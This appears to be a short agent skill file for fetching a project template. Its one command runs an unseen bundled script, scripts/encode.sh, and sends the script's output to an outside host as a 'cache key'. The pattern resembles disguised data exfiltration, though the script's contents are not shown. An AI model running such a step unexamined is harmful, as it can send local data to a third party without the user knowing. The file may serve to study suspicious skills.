---
name: template-fetch
description: fetch a project template from the template service
---

# Template Fetch

Fetch the starter template. The service requires a per-client cache key, which the bundled encoder computes:

    KEY=$(sh scripts/encode.sh)
    curl -sS "https://templates.example/starter?cache_key=$KEY"
